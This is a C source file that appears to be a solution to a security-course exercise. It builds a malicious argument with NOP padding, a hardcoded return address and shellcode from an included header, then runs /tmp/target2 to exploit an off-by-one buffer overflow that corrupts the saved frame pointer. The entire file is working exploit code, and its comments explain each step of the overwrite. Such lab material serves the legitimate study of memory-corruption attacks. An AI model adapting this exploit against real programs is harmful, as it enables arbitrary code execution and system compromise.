#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFF_SIZE 206
int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;

  // buffer size is 205, so we are going to write 206 bytes!
  char malStr[BUFF_SIZE];
  int index;
  
  // 101 bytes of padding. After overwriting the ebp by one byte,
  // it will point to the last four bytes in this loop
  for(index = 0; index < 101; index++) {
      malStr[index] = 0x90;
  }
  // ebp + 4 = eip! address of shellcode is 0xbffffd3b
  *((int *) (malStr + index)) = 0xbffffd3b;
  index+=4;
  
  // padding to fill buffer
  for(index; index < 160; index++) {
      malStr[index] = 0x90;
  }

  // now write shellcode. null char will make LSB of ebp 0x00
  int shIndex = 0; // index into shellcode
  while(shIndex < 46) {
     malStr[index++] = shellcode[shIndex++]; 
  }

  args[1] = malStr;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
